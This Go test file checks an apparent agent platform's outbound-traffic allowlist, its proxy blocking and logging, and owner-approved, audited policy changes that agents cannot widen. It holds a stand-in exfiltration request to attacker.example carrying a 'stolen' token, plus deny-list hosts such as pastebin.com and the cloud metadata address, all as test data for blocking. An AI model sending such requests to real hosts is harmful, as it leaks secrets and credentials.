package egress_test

import (
	"context"
	"net/http"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"

	"github.com/bestagentkits/sisf/internal/egress"
	"github.com/bestagentkits/sisf/internal/intake/intaketest"
	"github.com/bestagentkits/sisf/pkg/approvals"
	"github.com/bestagentkits/sisf/pkg/core"
	"github.com/bestagentkits/sisf/pkg/manifest"
)

const (
	revA core.CommitSHA = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	revB core.CommitSHA = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
)

func TestTheDefaultAllowlistCoversWhatDevelopmentNeedsAndNothingElse(t *testing.T) {
	t.Parallel()
	policy, err := egress.DefaultPolicy("anthropic", "openai")
	if err != nil {
		t.Fatal(err)
	}
	if policy.Mode != core.EgressAllowlist {
		t.Fatalf("the default mode is %s, want allowlist", policy.Mode)
	}
	allowed := map[string]string{
		"api.anthropic.com": "model provider", "api.openai.com": "model provider",
		"github.com": "GitHub", "api.github.com": "GitHub", "raw.githubusercontent.com": "GitHub", "objects.githubusercontent.com": "GitHub",
		"registry.npmjs.org": "npm", "pypi.org": "PyPI", "files.pythonhosted.org": "PyPI",
		"crates.io": "crates.io", "static.crates.io": "crates.io", "proxy.golang.org": "Go proxy", "sum.golang.org": "Go checksums",
		"repo.maven.apache.org": "Maven Central", "registry-1.docker.io": "Docker Hub", "auth.docker.io": "Docker Hub",
		"ghcr.io": "GHCR", "deb.debian.org": "Debian", "archive.ubuntu.com": "Ubuntu", "dl-cdn.alpinelinux.org": "Alpine",
	}
	for host, what := range allowed {
		if !egress.Allows(policy, host) {
			t.Errorf("%s (%s) is not allowed by default", host, what)
		}
	}
	for _, host := range []string{"attacker.example", "githubusercontent.com", "evilgithub.com", "github.com.attacker.example",
		"pastebin.com", "api.mistral.ai", "169.254.169.254", "localhost", ""} {
		if egress.Allows(policy, host) {
			t.Errorf("%q is allowed by default", host)
		}
	}
	if _, err := egress.DefaultPolicy("someone-unknown"); !core.HasCode(err, core.CodeInvalidArgument) {
		t.Fatalf("an unknown provider was accepted: %v", err)
	}
}

// The sample manifest's egress list is the default list for its providers.
func TestTheSampleManifestAllowsOnlyDefaultDestinations(t *testing.T) {
	t.Parallel()
	_, file, _, _ := runtime.Caller(0)
	m, err := manifest.Load(filepath.Join(filepath.Dir(file), "..", "..", ".sisf", "factory.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	var providers []string
	for _, route := range m.ModelRoutes.Routes {
		providers = append(providers, route.Provider)
	}
	policy, err := egress.DefaultPolicy(providers...)
	if err != nil {
		t.Fatal(err)
	}
	for _, host := range m.Egress.Allow {
		if !egress.Allows(policy, strings.TrimPrefix(host, "*.")) && !egress.Allows(policy, "x."+strings.TrimPrefix(host, "*.")) {
			t.Errorf("the sample manifest allows %s, which is not in the default list", host)
		}
	}
}

func TestBlockedDestinationsAreLoggedForOwnerReviewWithoutWhatWasSent(t *testing.T) {
	t.Parallel()
	policy, _ := egress.DefaultPolicy("anthropic")
	proxy, recorder := startProxy(t, egress.StaticPolicy(policy), newNetwork())
	if got := status(t, proxy, connect("attacker.example:443", "attacker.example:443")); got != http.StatusForbidden {
		t.Fatalf("CONNECT to a host off the list: status %d", got)
	}
	if got := status(t, proxy, get("http://attacker.example/collect?token=stolen-value-0001", "attacker.example")); got != http.StatusForbidden {
		t.Fatalf("GET to a host off the list: status %d", got)
	}
	dests := recorder.Destinations()
	if len(dests) != 1 || dests[0].Host != "attacker.example" || dests[0].Count != 2 || !dests[0].LastAt.Equal(start) {
		t.Fatalf("the Owner's review list is wrong: %+v", dests)
	}
	for _, b := range recorder.Recent() {
		if strings.Contains(b.Host+b.Port+b.Reason+b.Method, "stolen") {
			t.Fatalf("the log kept what the client tried to send: %+v", b)
		}
	}
}

// fixture is the policy service over in-memory state, with a baseline the
// test can move to another revision.
type fixture struct {
	svc    *egress.Service
	store  *approvals.KVStore
	state  *intaketest.State
	audit  *intaketest.AuditLog
	clock  *intaketest.Clock
	owner  core.Actor
	agent  core.Actor
	mu     sync.Mutex
	base   core.EgressPolicy
	baseAt core.CommitSHA
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	clock := intaketest.NewClock(start)
	keys := intaketest.NewKeys("approval-key")
	f := &fixture{state: intaketest.NewState(clock), audit: &intaketest.AuditLog{}, clock: clock, baseAt: revA,
		base:  core.EgressPolicy{Mode: core.EgressAllowlist, Allow: []string{"api.anthropic.com", "github.com"}},
		owner: core.Actor{ID: "owner-1", Kind: core.ActorHuman, Roles: []core.Role{core.RoleOwner}, Surface: core.SurfaceAPI, StepUpAt: start},
		agent: core.Actor{ID: "agent:run-0001", Kind: core.ActorAgent, Roles: []core.Role{core.RoleAgent}, Surface: core.SurfaceMCP},
	}
	var err error
	f.store, err = approvals.NewStore(approvals.Config{State: f.state, FactoryID: "acme-app", Signer: keys, Verifier: keys, Audit: f.audit, Clock: clock})
	if err != nil {
		t.Fatal(err)
	}
	f.svc, err = egress.NewService(egress.ServiceConfig{FactoryID: "acme-app", State: f.state, Approvals: f.store, Audit: f.audit,
		Baseline: egress.BaselineFunc(f.baseline), Clock: clock})
	if err != nil {
		t.Fatal(err)
	}
	return f
}

func (f *fixture) baseline(context.Context) (core.EgressPolicy, core.CommitSHA, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.base, f.baseAt, nil
}

func (f *fixture) inForce(t *testing.T) core.EgressPolicy {
	t.Helper()
	p, err := f.svc.EgressPolicy(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	return p
}

func widened(hosts ...string) core.EgressPolicy {
	return core.EgressPolicy{Mode: core.EgressAllowlist, Allow: append([]string{"api.anthropic.com", "github.com"}, hosts...)}
}

func TestThePolicyChangesOnlyThroughPlanApprovalExecuteAndAudit(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	f := newFixture(t)
	plan, err := f.svc.Plan(ctx, f.owner, widened("registry.example.org"))
	if err != nil {
		t.Fatal(err)
	}
	if plan.RiskWarning == "" || !strings.Contains(plan.Request.RiskSummary, "registry.example.org") || !plan.Request.StepUp {
		t.Fatalf("a widening plan must warn and need step-up: %+v", plan)
	}
	if egress.Allows(f.inForce(t), "registry.example.org") {
		t.Fatal("planning alone changed the policy")
	}
	_, err = f.svc.Execute(ctx, f.owner, plan.Request.ID)
	wantCode(t, err, core.CodeApprovalRequired, "execute before the Owner decided")

	approve(t, f.store, f.owner, plan.Request)
	effective, err := f.svc.Execute(ctx, f.owner, plan.Request.ID)
	if err != nil {
		t.Fatal(err)
	}
	if !egress.Allows(effective.Policy, "registry.example.org") || effective.RequestID != plan.Request.ID || effective.ApprovedBy != "owner-1" {
		t.Fatalf("the approved change is not in force: %+v", effective)
	}
	_, err = f.svc.Execute(ctx, f.owner, plan.Request.ID)
	wantCode(t, err, core.CodeReplayed, "executing the same approval twice")

	for _, step := range []string{"egress.policy.plan", "egress.policy.execute"} {
		if len(f.audit.Find(step, core.OutcomeExecuted)) != 1 {
			t.Fatalf("%s was not audited once", step)
		}
	}
	if len(f.audit.Find("egress.policy.execute", core.OutcomeFailed)) != 2 {
		t.Fatal("the refused executions were not audited")
	}
}

func TestAnAgentCannotWidenThePolicyNorTurnBlockingOff(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	f := newFixture(t)
	agentAsOwner := f.agent
	agentAsOwner.Roles = append(agentAsOwner.Roles, core.RoleOwner)
	humanAgentRole := core.Actor{ID: "bot", Kind: core.ActorHuman, Roles: []core.Role{core.RoleAgent, core.RoleOwner}}
	for name, actor := range map[string]core.Actor{"agent": f.agent, "agent holding the owner role": agentAsOwner, "agent role": humanAgentRole} {
		for what, proposed := range map[string]core.EgressPolicy{
			"widen":     widened("attacker.example"),
			"wildcard":  widened("*.example.org"),
			"turn off":  {Mode: core.EgressUnrestricted, Allow: widened().Allow},
			"swap host": {Mode: core.EgressAllowlist, Allow: []string{"api.anthropic.com", "attacker.example"}},
		} {
			_, err := f.svc.Plan(ctx, actor, proposed)
			wantCode(t, err, core.CodePermissionDenied, name+" proposing to "+what)
		}
	}
	if requests, _ := f.store.List(ctx, approvals.Filter{}); len(requests) != 0 {
		t.Fatalf("refused proposals filed %d approval requests", len(requests))
	}
	if len(f.audit.Find("egress.policy.plan", core.OutcomeDenied)) != 12 {
		t.Fatal("the refused proposals were not audited")
	}

	// Even an approved widening cannot be executed by an agent.
	plan, err := f.svc.Plan(ctx, f.owner, widened("registry.example.org"))
	if err != nil {
		t.Fatal(err)
	}
	approve(t, f.store, f.owner, plan.Request)
	_, err = f.svc.Execute(ctx, f.agent, plan.Request.ID)
	wantCode(t, err, core.CodePermissionDenied, "agent executing an approved widening")
	if egress.Allows(f.inForce(t), "registry.example.org") {
		t.Fatal("the agent widened the policy")
	}

	// An agent may propose to narrow; the Owner still decides.
	narrow, err := f.svc.Plan(ctx, f.agent, core.EgressPolicy{Mode: core.EgressAllowlist, Allow: []string{"github.com"}})
	if err != nil || narrow.RiskWarning != "" || narrow.Request.Status != approvals.StatusPending {
		t.Fatalf("an agent's narrowing plan: %+v, %v", narrow, err)
	}
	// Nobody without a role may propose anything.
	_, err = f.svc.Plan(ctx, core.Actor{ID: "reporter", Kind: core.ActorHuman, Roles: []core.Role{core.RoleReporter}}, widened("x.example.org"))
	wantCode(t, err, core.CodePermissionDenied, "reporter")
}

func TestTurningBlockingOffCarriesARiskWarning(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	f := newFixture(t)
	plan, err := f.svc.Plan(ctx, f.owner, core.EgressPolicy{Mode: core.EgressUnrestricted, Allow: widened().Allow})
	if err != nil {
		t.Fatal(err)
	}
	if !plan.Change.TurnsOffBlocking() || !strings.Contains(plan.RiskWarning, "Turning off egress blocking") ||
		plan.Request.RiskSummary != plan.RiskWarning {
		t.Fatalf("turning blocking off must carry the warning: %+v", plan)
	}
	narrow, err := f.svc.Plan(ctx, f.owner, core.EgressPolicy{Mode: core.EgressAllowlist, Allow: []string{"github.com"}})
	if err != nil || narrow.RiskWarning != "" {
		t.Fatalf("narrowing carries no warning: %q, %v", narrow.RiskWarning, err)
	}
	_, err = f.svc.Plan(ctx, f.owner, widened())
	wantCode(t, err, core.CodeConflict, "a plan that changes nothing")
}

func TestAChangeAppliesOnlyToThePolicyItWasPlannedAgainst(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	f := newFixture(t)
	first, err := f.svc.Plan(ctx, f.owner, widened("one.example.org"))
	if err != nil {
		t.Fatal(err)
	}
	second, err := f.svc.Plan(ctx, f.owner, widened("two.example.org"))
	if err != nil {
		t.Fatal(err)
	}
	approve(t, f.store, f.owner, first.Request)
	approve(t, f.store, f.owner, second.Request)
	if _, err := f.svc.Execute(ctx, f.owner, first.Request.ID); err != nil {
		t.Fatal(err)
	}
	_, err = f.svc.Execute(ctx, f.owner, second.Request.ID)
	wantCode(t, err, core.CodeConflict, "a change planned against the replaced policy")

	// A newly approved policy revision replaces the earlier approved change.
	f.mu.Lock()
	f.base, f.baseAt = core.EgressPolicy{Mode: core.EgressAllowlist, Allow: []string{"github.com"}}, revB
	f.mu.Unlock()
	if p := f.inForce(t); egress.Allows(p, "one.example.org") || !egress.Allows(p, "github.com") {
		t.Fatalf("the new revision is not in force: %+v", p)
	}
}
